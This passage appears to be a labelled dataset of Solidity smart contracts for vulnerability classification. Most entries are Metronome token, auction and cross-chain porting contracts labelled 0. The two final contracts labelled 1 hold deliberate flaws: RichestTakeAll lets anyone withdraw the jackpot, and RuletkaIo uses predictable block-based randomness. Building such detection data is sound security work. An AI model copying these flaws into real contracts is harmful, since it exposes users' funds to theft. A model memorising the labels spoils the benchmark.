   returnedEth = convert(WhichToken.Met, _mintReturn, _amount);        emit ConvertMetToEth(msg.sender, returnedEth, _amount);    }    function balanceOf(WhichToken which) internal view returns (uint) {        if (which == WhichToken.Eth) return address(this).balance;        if (which == WhichToken.Met) return reserveToken.balanceOf(this);        revert();    }    function convertingReturn(WhichToken whichFrom, uint _depositAmount) internal view returns (uint256) {                WhichToken to = WhichToken.Met;        if (whichFrom == WhichToken.Met) {            to = WhichToken.Eth;        }        uint reserveTokenBalanceFrom = balanceOf(whichFrom).add(_depositAmount);        uint mintRet = returnForMint(smartToken.totalSupply(), _depositAmount, reserveTokenBalanceFrom);                uint newSmartTokenSupply = smartToken.totalSupply().add(mintRet);        uint reserveTokenBalanceTo = balanceOf(to);        return returnForRedemption(            newSmartTokenSupply,            mintRet,            reserveTokenBalanceTo);    }    function convert(WhichToken whichFrom, uint _minReturn, uint amnt) internal returns (uint) {        WhichToken to = WhichToken.Met;        if (whichFrom == WhichToken.Met) {            to = WhichToken.Eth;            require(reserveToken.transferFrom(msg.sender, this, amnt));        }        uint mintRet = mint(whichFrom, amnt, 1);                return redeem(to, mintRet, _minReturn);    }    function mint(WhichToken which, uint _depositAmount, uint _minReturn) internal returns (uint256 amount) {        require(_minReturn > 0);        amount = mintingReturn(which, _depositAmount);        require(amount >= _minReturn);        require(smartToken.mint(msg.sender, amount));    }    function mintingReturn(WhichToken which, uint _depositAmount) internal view returns (uint256) {        uint256 smartTokenSupply = smartToken.totalSupply();        uint256 reserveBalance = balanceOf(which);        return returnForMint(smartTokenSupply, _depositAmount, reserveBalance);    }    function redeem(WhichToken which, uint _amount, uint _minReturn) internal returns (uint redeemable) {        require(_amount <= smartToken.balanceOf(msg.sender));        require(_minReturn > 0);        redeemable = redemptionReturn(which, _amount);        require(redeemable >= _minReturn);        uint256 reserveBalance = balanceOf(which);        require(reserveBalance >= redeemable);        uint256 tokenSupply = smartToken.totalSupply();        require(_amount < tokenSupply);        smartToken.destroy(msg.sender, _amount);        if (which == WhichToken.Eth) {            msg.sender.transfer(redeemable);        } else {            require(reserveToken.transfer(msg.sender, redeemable));        }    }    function redemptionReturn(WhichToken which, uint smartTokensSent) internal view returns (uint256) {        uint smartTokenSupply = smartToken.totalSupply();        uint reserveTokenBalance = balanceOf(which);        return returnForRedemption(            smartTokenSupply,            smartTokensSent,            reserveTokenBalance);    }}
0<CODESPLIT>contract Proceeds is Owned {    using SafeMath for uint256;    AutonomousConverter public autonomousConverter;    Auctions public auctions;    event LogProceedsIn(address indexed from, uint value);     event LogClosedAuction(address indexed from, uint value);    uint latestAuctionClosed;    function initProceeds(address _autonomousConverter, address _auctions) public onlyOwner {        require(address(auctions) == 0x0 && _auctions != 0x0);        require(address(autonomousConverter) == 0x0 && _autonomousConverter != 0x0);        autonomousConverter = AutonomousConverter(_autonomousConverter);        auctions = Auctions(_auctions);    }    function handleFund() public payable {        require(msg.sender == address(auctions));        emit LogProceedsIn(msg.sender, msg.value);    }    function closeAuction() public {        uint lastPurchaseTick = auctions.lastPurchaseTick();        uint currentAuction = auctions.currentAuction();        uint val = ((address(this).balance).mul(25)).div(10000);         if (val > 0 && (currentAuction > auctions.whichAuction(lastPurchaseTick))             && (latestAuctionClosed < currentAuction)) {            latestAuctionClosed = currentAuction;            autonomousConverter.handleFund.value(val)();            emit LogClosedAuction(msg.sender, val);        }    }}
0<CODESPLIT>contract Auctions is Pricer, Owned {    using SafeMath for uint256;    METToken public token;    Proceeds public proceeds;    address[] public founders;    mapping(address => TokenLocker) public tokenLockers;    uint internal constant DAY_IN_SECONDS = 86400;    uint internal constant DAY_IN_MINUTES = 1440;    uint public genesisTime;    uint public lastPurchaseTick;    uint public lastPurchasePrice;    uint public constant INITIAL_GLOBAL_DAILY_SUPPLY = 2880 * METDECMULT;    uint public INITIAL_FOUNDER_SUPPLY = 1999999 * METDECMULT;    uint public INITIAL_AC_SUPPLY = 1 * METDECMULT;    uint public totalMigratedOut = 0;    uint public totalMigratedIn = 0;    uint public timeScale = 1;    uint public constant INITIAL_SUPPLY = 10000000 * METDECMULT;    uint public mintable = INITIAL_SUPPLY;    uint public initialAuctionDuration = 7 days;    uint public initialAuctionEndTime;    uint public dailyAuctionStartTime;    uint public constant DAILY_PURCHASE_LIMIT = 1000 ether;    mapping (address => uint) internal purchaseInTheAuction;    mapping (address => uint) internal lastPurchaseAuction;    bool public minted;    bool public initialized;    uint public globalSupplyAfterPercentageLogic = 52598080 * METDECMULT;    uint public constant AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS = 14791;    bytes8 public chain = "ETH";    event LogAuctionFundsIn(address indexed sender, uint amount, uint tokens, uint purchasePrice, uint refund);    function Auctions() public {        mintable = INITIAL_SUPPLY - 2000000 * METDECMULT;    }    function () public payable running {        require(msg.value > 0);                uint amountForPurchase = msg.value;        uint excessAmount;        if (currentAuction() > whichAuction(lastPurchaseTick)) {            proceeds.closeAuction();            restartAuction();        }        if (isInitialAuctionEnded()) {            require(now >= dailyAuctionStartTime);            if (lastPurchaseAuction[msg.sender] < currentAuction()) {                if (amountForPurchase > DAILY_PURCHASE_LIMIT) {                    excessAmount = amountForPurchase.sub(DAILY_PURCHASE_LIMIT);                    amountForPurchase = DAILY_PURCHASE_LIMIT;                }                           purchaseInTheAuction[msg.sender] = msg.value;                lastPurchaseAuction[msg.sender] = currentAuction();            } else {                require(purchaseInTheAuction[msg.sender] < DAILY_PURCHASE_LIMIT);                if (purchaseInTheAuction[msg.sender].add(amountForPurchase) > DAILY_PURCHASE_LIMIT) {                    excessAmount = (purchaseInTheAuction[msg.sender].add(amountForPurchase)).sub(DAILY_PURCHASE_LIMIT);                    amountForPurchase = amountForPurchase.sub(excessAmount);                }                purchaseInTheAuction[msg.sender] = purchaseInTheAuction[msg.sender].add(msg.value);            }        }        uint _currentTick = currentTick();        uint weiPerToken;        uint tokens;        uint refund;        (weiPerToken, tokens, refund) = calcPurchase(amountForPurchase, _currentTick);        require(tokens > 0);        if (now < initialAuctionEndTime && (token.totalSupply()).add(tokens) >= INITIAL_SUPPLY) {            initialAuctionEndTime = now;            dailyAuctionStartTime = ((initialAuctionEndTime / 1 days) + 1) * 1 days;        }        lastPurchaseTick = _currentTick;        lastPurchasePrice = weiPerToken;        assert(tokens <= mintable);        mintable = mintable.sub(tokens);        assert(refund <= amountForPurchase);        uint ethForProceeds = amountForPurchase.sub(refund);        proceeds.handleFund.value(ethForProceeds)();        require(token.mint(msg.sender, tokens));        refund = refund.add(excessAmount);        if (refund > 0) {            if (purchaseInTheAuction[msg.sender] > 0) {                purchaseInTheAuction[msg.sender] = purchaseInTheAuction[msg.sender].sub(refund);            }            msg.sender.transfer(refund);        }        emit LogAuctionFundsIn(msg.sender, ethForProceeds, tokens, lastPurchasePrice, refund);    }    modifier running() {        require(isRunning());        _;    }    function isRunning() public constant returns (bool) {        return (block.timestamp >= genesisTime && genesisTime > 0);    }    function currentTick() public view returns(uint) {        return whichTick(block.timestamp);    }    function currentAuction() public view returns(uint) {        return whichAuction(currentTick());    }    function whichTick(uint t) public view returns(uint) {        if (genesisTime > t) {             revert();         }        return (t - genesisTime) * timeScale / 1 minutes;    }    function whichAuction(uint t) public view returns(uint) {        if (whichTick(dailyAuctionStartTime) > t) {            return 0;        } else {            return ((t - whichTick(dailyAuctionStartTime)) / DAY_IN_MINUTES) + 1;        }    }    function heartbeat() public view returns (        bytes8 _chain,        address auctionAddr,        address convertAddr,        address tokenAddr,        uint minting,        uint totalMET,        uint proceedsBal,        uint currTick,        uint currAuction,        uint nextAuctionGMT,        uint genesisGMT,        uint currentAuctionPrice,        uint _dailyMintable,        uint _lastPurchasePrice) {        _chain = chain;        convertAddr = proceeds.autonomousConverter();        tokenAddr = token;        auctionAddr = this;        totalMET = token.totalSupply();        proceedsBal = address(proceeds).balance;        currTick = currentTick();        currAuction = currentAuction();        if (currAuction == 0) {            nextAuctionGMT = dailyAuctionStartTime;        } else {            nextAuctionGMT = (currAuction * DAY_IN_SECONDS) / timeScale + dailyAuctionStartTime;        }        genesisGMT = genesisTime;        currentAuctionPrice = currentPrice();        _dailyMintable = dailyMintable();        minting = currentMintable();        _lastPurchasePrice = lastPurchasePrice;    }    function skipInitBecauseIAmNotOg(address _token, address _proceeds, uint _genesisTime,         uint _minimumPrice, uint _startingPrice, uint _timeScale, bytes8 _chain,         uint _initialAuctionEndTime) public onlyOwner returns (bool) {        require(!minted);        require(!initialized);        require(_timeScale != 0);        require(address(token) == 0x0 && _token != 0x0);        require(address(proceeds) == 0x0 && _proceeds != 0x0);        initPricer();        token = METToken(_token);        proceeds = Proceeds(_proceeds);        INITIAL_FOUNDER_SUPPLY = 0;        INITIAL_AC_SUPPLY = 0;        mintable = 0;  //         genesisTime = _genesisTime;        initialAuctionEndTime = _initialAuctionEndTime;        if (initialAuctionEndTime == (initialAuctionEndTime / 1 days) * 1 days) {            dailyAuctionStartTime = initialAuctionEndTime;        } else {            dailyAuctionStartTime = ((initialAuctionEndTime / 1 days) + 1) * 1 days;        }        lastPurchaseTick = 0;        if (_minimumPrice > 0) {            minimumPrice = _minimumPrice;        }        timeScale = _timeScale;        if (_startingPrice > 0) {            lastPurchasePrice = _startingPrice * 1 ether;        } else {            lastPurchasePrice = 2 ether;        }        chain = _chain;        minted = true;        initialized = true;        return true;    }    function initAuctions(uint _startTime, uint _minimumPrice, uint _startingPrice, uint _timeScale)         public onlyOwner returns (bool)     {        require(minted);        require(!initialized);        require(_timeScale != 0);        initPricer();        if (_startTime > 0) {             genesisTime = (_startTime / (1 minutes)) * (1 minutes) + 60;        } else {            genesisTime = block.timestamp + 60 - (block.timestamp % 60);        }        initialAuctionEndTime = genesisTime + initialAuctionDuration;        if (initialAuctionEndTime == (initialAuctionEndTime / 1 days) * 1 days) {            dailyAuctionStartTime = initialAuctionEndTime;        } else {            dailyAuctionStartTime = ((initialAuctionEndTime / 1 days) + 1) * 1 days;        }        lastPurchaseTick = 0;        if (_minimumPrice > 0) {            minimumPrice = _minimumPrice;        }        timeScale = _timeScale;        if (_startingPrice > 0) {            lastPurchasePrice = _startingPrice * 1 ether;        } else {            lastPurchasePrice = 2 ether;        }        for (uint i = 0; i < founders.length; i++) {            TokenLocker tokenLocker = tokenLockers[founders[i]];            tokenLocker.lockTokenLocker();        }                initialized = true;        return true;    }    function createTokenLocker(address _founder, address _token) public onlyOwner {        require(_token != 0x0);        require(_founder != 0x0);        founders.push(_founder);        TokenLocker tokenLocker = new TokenLocker(address(this), _token);        tokenLockers[_founder] = tokenLocker;        tokenLocker.changeOwnership(_founder);    }    function mintInitialSupply(uint[] _founders, address _token,         address _proceeds, address _autonomousConverter) public onlyOwner returns (bool)     {        require(!minted);        require(_founders.length != 0);        require(address(token) == 0x0 && _token != 0x0);        require(address(proceeds) == 0x0 && _proceeds != 0x0);        require(_autonomousConverter != 0x0);        token = METToken(_token);        proceeds = Proceeds(_proceeds);        uint foundersTotal;        for (uint i = 0; i < _founders.length; i++) {            address addr = address(_founders[i] >> 96);            require(addr != 0x0);            uint amount = _founders[i] & ((1 << 96) - 1);            require(amount > 0);            TokenLocker tokenLocker = tokenLockers[addr];            require(token.mint(address(tokenLocker), amount));            tokenLocker.deposit(addr, amount);            foundersTotal = foundersTotal.add(amount);        }        require(foundersTotal == INITIAL_FOUNDER_SUPPLY);        require(token.mint(_autonomousConverter, INITIAL_AC_SUPPLY));        minted = true;        return true;    }    function stopEverything() public onlyOwner {        if (genesisTime < block.timestamp) {            revert();         }        genesisTime = genesisTime + 1000 years;        initialAuctionEndTime = genesisTime;        dailyAuctionStartTime = genesisTime;    }    function isInitialAuctionEnded() public view returns (bool) {        return (initialAuctionEndTime != 0 &&             (now >= initialAuctionEndTime || token.totalSupply() >= INITIAL_SUPPLY));    }    function globalMetSupply() public view returns (uint) {        uint currAuc = currentAuction();        if (currAuc > AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS) {            return globalSupplyAfterPercentageLogic;        } else {            return INITIAL_SUPPLY.add(INITIAL_GLOBAL_DAILY_SUPPLY.mul(currAuc));        }    }    function globalDailySupply() public view returns (uint) {        uint dailySupply = INITIAL_GLOBAL_DAILY_SUPPLY;        uint thisAuction = currentAuction();        if (thisAuction > AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS) {            uint lastAuctionPurchase = whichAuction(lastPurchaseTick);            uint recentAuction = AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS + 1;            if (lastAuctionPurchase > recentAuction) {                recentAuction = lastAuctionPurchase;            }            uint totalAuctions = thisAuction - recentAuction;            if (totalAuctions > 1) {                uint factor = 36525 + ((totalAuctions - 1) * 2);                dailySupply = (globalSupplyAfterPercentageLogic.mul(2).mul(factor)).div(36525 ** 2);            } else {                dailySupply = globalSupplyAfterPercentageLogic.mul(2).div(36525);            }            if (dailySupply < INITIAL_GLOBAL_DAILY_SUPPLY) {                dailySupply = INITIAL_GLOBAL_DAILY_SUPPLY;             }        }        return dailySupply;    }    function currentPrice() public constant returns (uint weiPerToken) {        weiPerToken = calcPriceAt(currentTick());    }    function dailyMintable() public constant returns (uint) {        return nextAuctionSupply(0);    }    function tokensOnThisChain() public view returns (uint) {        uint totalSupply = token.totalSupply();        uint currMintable = currentMintable();        return totalSupply.add(currMintable);    }    function currentMintable() public view returns (uint) {        uint currMintable = mintable;        uint currAuction = currentAuction();        uint totalAuctions = currAuction.sub(whichAuction(lastPurchaseTick));        if (totalAuctions > 0) {            currMintable = mintable.add(nextAuctionSupply(totalAuctions));        }        return currMintable;    }    function prepareAuctionForNonOGChain() public {        require(msg.sender == address(token.tokenPorter()) || msg.sender == address(token));        require(token.totalSupply() == 0);        require(chain != "ETH");        lastPurchaseTick = currentTick();    }    function whatWouldPurchaseDo(uint _wei, uint _timestamp) public constant        returns (uint weiPerToken, uint tokens, uint refund)    {        weiPerToken = calcPriceAt(whichTick(_timestamp));        uint calctokens = METDECMULT.mul(_wei).div(weiPerToken);        tokens = calctokens;        if (calctokens > mintable) {            tokens = mintable;            uint weiPaying = mintable.mul(weiPerToken).div(METDECMULT);            refund = _wei.sub(weiPaying);        }    }        function nextAuction() internal constant returns(uint _startTime, uint _startPrice, uint _auctionTokens) {        if (block.timestamp < genesisTime) {            _startTime = genesisTime;            _startPrice = lastPurchasePrice;            _auctionTokens = mintable;            return;        }        uint recentAuction = whichAuction(lastPurchaseTick);        uint currAuc = currentAuction();        uint totalAuctions = currAuc - recentAuction;        _startTime = dailyAuctionStartTime;        if (currAuc > 1) {            _startTime = auctionStartTime(currentTick());        }        _auctionTokens = nextAuctionSupply(totalAuctions);        if (totalAuctions > 1) {            _startPrice = lastPurchasePrice / 100 + 1;        } else {            if (mintable == 0 || totalAuctions == 0) {                _startPrice = (lastPurchasePrice * 2) + 1;               } else {                if (currAuc == 1) {                    _startPrice = minimumPrice * 2;                } else {                    uint tickWhenAuctionEnded = whichTick(_startTime);                    uint numTick = 0;                    if (tickWhenAuctionEnded > lastPurchaseTick) {                        numTick = tickWhenAuctionEnded - lastPurchaseTick;                    }                    _startPrice = priceAt(lastPurchasePrice, numTick) * 2;                }                                            }        }    }    function calcPurchase(uint _wei, uint _t) internal view returns (uint weiPerToken, uint tokens, uint refund)    {        require(_t >= lastPurchaseTick);        uint numTicks = _t - lastPurchaseTick;        if (isInitialAuctionEnded()) {            weiPerToken = priceAt(lastPurchasePrice, numTicks);        } else {            weiPerToken = priceAtInitialAuction(lastPurchasePrice, numTicks);        }        uint calctokens = METDECMULT.mul(_wei).div(weiPerToken);        tokens = calctokens;        if (calctokens > mintable) {            tokens = mintable;            uint ethPaying = mintable.mul(weiPerToken).div(METDECMULT);            refund = _wei.sub(ethPaying);        }    }    function nextAuctionSupply(uint totalAuctionMissed) internal view returns (uint supply) {        uint thisAuction = currentAuction();        uint tokensHere = token.totalSupply().add(mintable);        supply = INITIAL_GLOBAL_DAILY_SUPPLY;        uint dailySupplyAtLastPurchase;        if (thisAuction > AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS) {            supply = globalDailySupply();            if (totalAuctionMissed > 1) {                dailySupplyAtLastPurchase = globalSupplyAfterPercentageLogic.mul(2).div(36525);                supply = dailySupplyAtLastPurchase.add(supply).mul(totalAuctionMissed).div(2);            }             supply = (supply.mul(tokensHere)).div(globalSupplyAfterPercentageLogic);        } else {            if (totalAuctionMissed > 1) {                supply = supply.mul(totalAuctionMissed);            }            uint previousGlobalMetSupply =             INITIAL_SUPPLY.add(INITIAL_GLOBAL_DAILY_SUPPLY.mul(whichAuction(lastPurchaseTick)));            supply = (supply.mul(tokensHere)).div(previousGlobalMetSupply);                }    }    function calcPriceAt(uint _tick) internal constant returns (uint weiPerToken) {        uint recentAuction = whichAuction(lastPurchaseTick);        uint totalAuctions = whichAuction(_tick).sub(recentAuction);        uint prevPrice;        uint numTicks = 0;        if (mintable == 0 && totalAuctions == 0) {            return lastPurchasePrice;        }        if (totalAuctions > 1) {            prevPrice = lastPurchasePrice / 100 + 1;            numTicks = numTicksSinceAuctionStart(_tick);        } else if (totalAuctions == 1) {            if (mintable == 0) {                prevPrice = lastPurchasePrice * 2;            } else {                if (whichAuction(_tick) == 1) {                    prevPrice = minimumPrice * 2;                } else {                    prevPrice = priceAt(lastPurchasePrice, numTicksTillAuctionStart(_tick)) * 2;                }            }            numTicks = numTicksSinceAuctionStart(_tick);        } else {            prevPrice = lastPurchasePrice;            numTicks = _tick - lastPurchaseTick;        }        require(numTicks >= 0);        if (isInitialAuctionEnded()) {            weiPerToken = priceAt(prevPrice, numTicks);        } else {            weiPerToken = priceAtInitialAuction(prevPrice, numTicks);        }    }    function numTicksSinceAuctionStart(uint _tick) private view returns (uint ) {        uint currentAuctionStartTime = auctionStartTime(_tick);        return _tick - whichTick(currentAuctionStartTime);    }        function numTicksTillAuctionStart(uint _tick) private view returns (uint) {        uint currentAuctionStartTime = auctionStartTime(_tick);        return whichTick(currentAuctionStartTime) - lastPurchaseTick;    }    function auctionStartTime(uint _tick) private view returns (uint) {        return ((whichAuction(_tick)) * 1 days) / timeScale + dailyAuctionStartTime - 1 days;    }    function restartAuction() private {        uint time;        uint price;        uint auctionTokens;        (time, price, auctionTokens) = nextAuction();        uint thisAuction = currentAuction();        if (thisAuction > AUCTION_WHEN_PERCENTAGE_LOGIC_STARTS) {            globalSupplyAfterPercentageLogic = globalSupplyAfterPercentageLogic.add(globalDailySupply());        }        mintable = mintable.add(auctionTokens);        lastPurchasePrice = price;        lastPurchaseTick = whichTick(time);    }}
0<CODESPLIT>contract TokenLocker is Ownable {    using SafeMath for uint;    uint internal constant QUARTER = 91 days + 450 minutes;      Auctions public auctions;    METToken public token;    bool public locked = false;      uint public deposited;    uint public lastWithdrawTime;    uint public quarterlyWithdrawable;        event Withdrawn(address indexed who, uint amount);    event Deposited(address indexed who, uint amount);    modifier onlyAuction() {        require(msg.sender == address(auctions));        _;    }    modifier preLock() {         require(!locked);        _;     }    modifier postLock() {         require(locked);         _;     }    function TokenLocker(address _auctions, address _token) public {        require(_auctions != 0x0);        require(_token != 0x0);        auctions = Auctions(_auctions);        token = METToken(_token);    }    function lockTokenLocker() public onlyAuction {        require(auctions.initialAuctionEndTime() != 0);        require(auctions.initialAuctionEndTime() >= auctions.genesisTime());         locked = true;    }    function deposit (address beneficiary, uint amount ) public onlyAuction preLock {        uint totalBalance = token.balanceOf(this);        require(totalBalance.sub(deposited) >= amount);        deposited = deposited.add(amount);        emit Deposited(beneficiary, amount);    }    function withdraw() public onlyOwner postLock {        require(deposited > 0);        uint withdrawable = 0;         uint withdrawTime = auctions.initialAuctionEndTime();        if (lastWithdrawTime == 0 && auctions.isInitialAuctionEnded()) {            withdrawable = withdrawable.add((deposited.mul(25)).div(100));            quarterlyWithdrawable = (deposited.sub(withdrawable)).div(12);            lastWithdrawTime = withdrawTime;        }        require(lastWithdrawTime != 0);        if (now >= lastWithdrawTime.add(QUARTER)) {            uint daysSinceLastWithdraw = now.sub(lastWithdrawTime);            uint totalQuarters = daysSinceLastWithdraw.div(QUARTER);            require(totalQuarters > 0);                    withdrawable = withdrawable.add(quarterlyWithdrawable.mul(totalQuarters));            if (now >= withdrawTime.add(QUARTER.mul(12))) {                withdrawable = deposited;            }            lastWithdrawTime = lastWithdrawTime.add(totalQuarters.mul(QUARTER));        }        if (withdrawable > 0) {            deposited = deposited.sub(withdrawable);            token.transfer(msg.sender, withdrawable);            emit Withdrawn(msg.sender, withdrawable);        }    }}interface ITokenPorter {    event ExportOnChainClaimedReceiptLog(address indexed destinationMetronomeAddr,         address indexed destinationRecipientAddr, uint amount);    event ExportReceiptLog(bytes8 destinationChain, address destinationMetronomeAddr,        address indexed destinationRecipientAddr, uint amountToBurn, uint fee, bytes extraData, uint currentTick,        uint indexed burnSequence, bytes32 indexed currentBurnHash, bytes32 prevBurnHash, uint dailyMintable,        uint[] supplyOnAllChains, uint genesisTime, uint blockTimestamp, uint dailyAuctionStartTime);    event ImportReceiptLog(address indexed destinationRecipientAddr, uint amountImported,         uint fee, bytes extraData, uint currentTick, uint indexed importSequence,         bytes32 indexed currentHash, bytes32 prevHash, uint dailyMintable, uint blockTimestamp, address caller);    function export(address tokenOwner, bytes8 _destChain, address _destMetronomeAddr,         address _destRecipAddr, uint _amount, uint _fee, bytes _extraData) public returns (bool);        function importMET(bytes8 _originChain, bytes8 _destinationChain, address[] _addresses, bytes _extraData,         bytes32[] _burnHashes, uint[] _supplyOnAllChains, uint[] _importData, bytes _proof) public returns (bool);}
0<CODESPLIT>contract TokenPorter is ITokenPorter, Owned {    using SafeMath for uint;    Auctions public auctions;    METToken public token;    Validator public validator;    ChainLedger public chainLedger;    uint public burnSequence = 1;    uint public importSequence = 1;    bytes32[] public exportedBurns;    uint[] public supplyOnAllChains = new uint[](6);    mapping(bytes8 => address) public destinationChains;    function initTokenPorter(address _tokenAddr, address _auctionsAddr) public onlyOwner {        require(_tokenAddr != 0x0);        require(_auctionsAddr != 0x0);        auctions = Auctions(_auctionsAddr);        token = METToken(_tokenAddr);    }    function setValidator(address _validator) public onlyOwner returns (bool) {        require(_validator != 0x0);        validator = Validator(_validator);        return true;    }    function setChainLedger(address _chainLedger) public onlyOwner returns (bool) {        require(_chainLedger != 0x0);        chainLedger = ChainLedger(_chainLedger);        return true;    }    function addDestinationChain(bytes8 _chainName, address _contractAddress)         public onlyOwner returns (bool)     {        require(_chainName != 0 && _contractAddress != address(0));        destinationChains[_chainName] = _contractAddress;        return true;    }    function removeDestinationChain(bytes8 _chainName) public onlyOwner returns (bool) {        require(_chainName != 0);        require(destinationChains[_chainName] != address(0));        destinationChains[_chainName] = address(0);        return true;       }    mapping (address  => mapping(address => uint)) public claimables;    function claimReceivables(address[] recipients) public returns (uint) {        require(recipients.length > 0);        uint total;        for (uint i = 0; i < recipients.length; i++) {            address recipient = recipients[i];            uint amountBurned = claimables[msg.sender][recipient];            if (amountBurned > 0) {                claimables[msg.sender][recipient] = 0;                emit ExportOnChainClaimedReceiptLog(msg.sender, recipient, amountBurned);                total = total.add(1);            }        }        return total;    }    function importMET(bytes8 _originChain, bytes8 _destinationChain, address[] _addresses, bytes _extraData,         bytes32[] _burnHashes, uint[] _supplyOnAllChains, uint[] _importData, bytes _proof) public returns (bool)    {                require(msg.sender == address(token));        require(_importData.length == 8);        require(_addresses.length == 2);        require(_burnHashes.length == 2);        require(validator.isReceiptClaimable(_originChain, _destinationChain, _addresses, _extraData, _burnHashes,         _supplyOnAllChains, _importData, _proof));        validator.claimHash(_burnHashes[1]);        require(_destinationChain == auctions.chain());        uint amountToImport = _importData[1].add(_importData[2]);        require(amountToImport.add(token.totalSupply()) <= auctions.globalMetSupply());        require(_addresses[0] == address(token));        if (_importData[1] == 0) {            return false;        }        if (importSequence == 1 && token.totalSupply() == 0) {            auctions.prepareAuctionForNonOGChain();        }                token.mint(_addresses[1], _importData[1]);        emit ImportReceiptLog(_addresses[1], _importData[1], _importData[2], _extraData,        auctions.currentTick(), importSequence, _burnHashes[1],        _burnHashes[0], auctions.dailyMintable(), now, msg.sender);        importSequence++;        chainLedger.registerImport(_originChain, _destinationChain, _importData[1]);        return true;    }    function export(address tokenOwner, bytes8 _destChain, address _destMetronomeAddr,        address _destRecipAddr, uint _amount, uint _fee, bytes _extraData) public returns (bool)     {        require(msg.sender == address(token));        require(_destChain != 0x0 && _destMetronomeAddr != 0x0 && _destRecipAddr != 0x0 && _amount != 0);        require(destinationChains[_destChain] == _destMetronomeAddr);                require(token.balanceOf(tokenOwner) >= _amount.add(_fee));        token.destroy(tokenOwner, _amount.add(_fee));        uint dailyMintable = auctions.dailyMintable();        uint currentTick = auctions.currentTick();                      if (burnSequence == 1) {            exportedBurns.push(keccak256(uint8(0)));        }        if (_destChain == auctions.chain()) {            claimables[_destMetronomeAddr][_destRecipAddr] =                 claimables[_destMetronomeAddr][_destRecipAddr].add(_amount);        }        uint blockTime = block.timestamp;        bytes32 currentBurn = keccak256(            blockTime,             auctions.chain(),            _destChain,             _destMetronomeAddr,             _destRecipAddr,             _amount,            currentTick,            auctions.genesisTime(),            dailyMintable,            token.totalSupply(),            _extraData,            exportedBurns[burnSequence - 1]);               exportedBurns.push(currentBurn);        supplyOnAllChains[0] = token.totalSupply();                emit ExportReceiptLog(_destChain, _destMetronomeAddr, _destRecipAddr, _amount, _fee, _extraData,             currentTick, burnSequence, currentBurn, exportedBurns[burnSequence - 1], dailyMintable,            supplyOnAllChains, auctions.genesisTime(), blockTime, auctions.dailyAuctionStartTime());        burnSequence = burnSequence + 1;        chainLedger.registerExport(auctions.chain(), _destChain, _amount);        return true;    }}    
0<CODESPLIT>contract ChainLedger is Owned {    using SafeMath for uint;    mapping (bytes8 => uint) public balance;    mapping (bytes8 => bool) public validChain;    bytes8[] public chains;    address public tokenPorter;    Auctions public auctions;    event LogRegisterChain(address indexed caller, bytes8 indexed chain, uint supply, bool outcome);    event LogRegisterExport(address indexed caller, bytes8 indexed originChain, bytes8 indexed destChain, uint amount);    event LogRegisterImport(address indexed caller, bytes8 indexed originChain, bytes8 indexed destChain, uint amount);    function initChainLedger(address _tokenPorter, address _auctionsAddr) public onlyOwner returns (bool) {        require(_tokenPorter != 0x0);        require(_auctionsAddr != 0x0);                tokenPorter = _tokenPorter;        auctions = Auctions(_auctionsAddr);                return true;    }    function registerChain(bytes8 chain, uint supply) public onlyOwner returns (bool) {        require(!validChain[chain]);         validChain[chain] = true;        chains.push(chain);        balance[chain] = supply;        emit LogRegisterChain(msg.sender, chain, supply, true);    }    function registerExport(bytes8 originChain, bytes8 destChain, uint amount) public {        require(msg.sender == tokenPorter || msg.sender == owner);        require(validChain[originChain] && validChain[destChain]);        require(balance[originChain] >= amount);        balance[originChain] = balance[originChain].sub(amount);        balance[destChain] = balance[destChain].add(amount);        emit LogRegisterExport(msg.sender, originChain, destChain, amount);    }    function registerImport(bytes8 originChain, bytes8 destChain, uint amount) public {        require(msg.sender == tokenPorter || msg.sender == owner);        require(validChain[originChain] && validChain[destChain]);        balance[originChain] = balance[originChain].sub(amount);        balance[destChain] = balance[destChain].add(amount);        emit LogRegisterImport(msg.sender, originChain, destChain, amount);    }  }
0<CODESPLIT>contract Validator is Owned {    mapping (bytes32 => mapping (address => bool)) public hashAttestations;    mapping (address => bool) public isValidator;    mapping (address => uint8) public validatorNum;    address[] public validators;    address public metToken;    address public tokenPorter;    mapping (bytes32 => bool) public hashClaimed;    uint8 public threshold = 2;    event LogAttestation(bytes32 indexed hash, address indexed who, bool isValid);    function initValidator(address _validator1, address _validator2, address _validator3) public onlyOwner {        for (uint8 i = 0; i < validators.length; i++) {            delete isValidator[validators[i]];            delete validatorNum[validators[i]];        }        delete validators;        validators.push(_validator1);        validators.push(_validator2);        validators.push(_validator3);        isValidator[_validator1] = true;        isValidator[_validator2] = true;        isValidator[_validator3] = true;        validatorNum[_validator1] = 0;        validatorNum[_validator2] = 1;        validatorNum[_validator3] = 2;    }    function setTokenPorter(address _tokenPorter) public onlyOwner returns (bool) {        require(_tokenPorter != 0x0);        tokenPorter = _tokenPorter;        return true;    }    function validateHash(bytes32 hash) public {        require(isValidator[msg.sender]);        hashAttestations[hash][msg.sender] = true;        emit LogAttestation(hash, msg.sender, true);    }    function invalidateHash(bytes32 hash) public {        require(isValidator[msg.sender]);        hashAttestations[hash][msg.sender] = false;        emit LogAttestation(hash, msg.sender, false);    }    function hashClaimable(bytes32 hash) public view returns(bool) {        if (hashClaimed[hash]) { return false; }        uint8 count = 0;        for (uint8 i = 0; i < validators.length; i++) {            if (hashAttestations[hash][validators[i]]) { count++;}         }        if (count >= threshold) { return true; }        return false;    }    function claimHash(bytes32 hash) public {        require(msg.sender == tokenPorter);        require(hashClaimable(hash));        hashClaimed[hash] = true;    }    function isReceiptClaimable(bytes8 _originChain, bytes8 _destinationChain, address[] _addresses, bytes _extraData,         bytes32[] _burnHashes, uint[] _supplyOnAllChain, uint[] _importData, bytes _proof) public view returns(bool) {        require(_burnHashes[1] == keccak256(_importData[0], _originChain, _destinationChain, _addresses[0],             _addresses[1], _importData[1], _importData[3], _importData[4], _importData[5], _supplyOnAllChain[0],             _extraData, _burnHashes[0]));        if (hashClaimable(_burnHashes[1])) {            return true;        }                 return false;    }}
1<CODESPLIT>contract RichestTakeAll {    uint public jackpot;    uint public withdrawDelay;    function takeAll() public {        require(block.timestamp >= withdrawDelay);        msg.sender.transfer(jackpot);        jackpot = 0;        return;    }}
1<CODESPLIT>contract RuletkaIo {    function random() private view returns (uint256) {        return uint256(uint256(keccak256(block.timestamp, block.difficulty)) % 6);    }}
